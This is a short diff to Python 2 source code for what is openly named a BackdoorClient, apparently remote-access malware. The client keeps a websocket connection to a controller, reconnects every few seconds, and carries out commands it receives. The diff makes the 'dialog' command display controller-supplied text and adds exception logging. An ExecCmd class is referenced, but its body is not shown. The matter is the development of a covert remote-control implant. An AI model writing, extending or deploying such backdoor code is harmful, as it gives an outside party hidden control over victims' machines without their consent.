@@ -42,11 +42,12 @@ class BackdoorClient(threading.Thread):
                     if 'cmd' in msg:
                         command = msg['cmd']
                         if command == 'dialog':
-                            ShowDialog('test')
+                            ShowDialog(msg['data'])
 
                 self.ws.close()
 
             except Exception as e:
+                print e.message
                 if self.ws:
                     self.ws.close()
                 time.sleep(3)
@@ -84,17 +85,10 @@ class ExecCmd(threading.Thread):
 
 
 class ShowDialog(threading.Thread):
-    def __init__(self, content, title=''):
+    def __init__(self, content, title=u''):
         threading.Thread.__init__(self)
-        self.content = u""
-        encoding = chardet.detect(content)['encoding']
-        if encoding:
-            self.content = content.decode(encoding)
-
-        self.title = u""
-        encoding = chardet.detect(title)['encoding']
-        if encoding:
-            self.title = title.decode(encoding)
+        self.content = content
+        self.title = title
 
         self.daemon = True
         self.start()
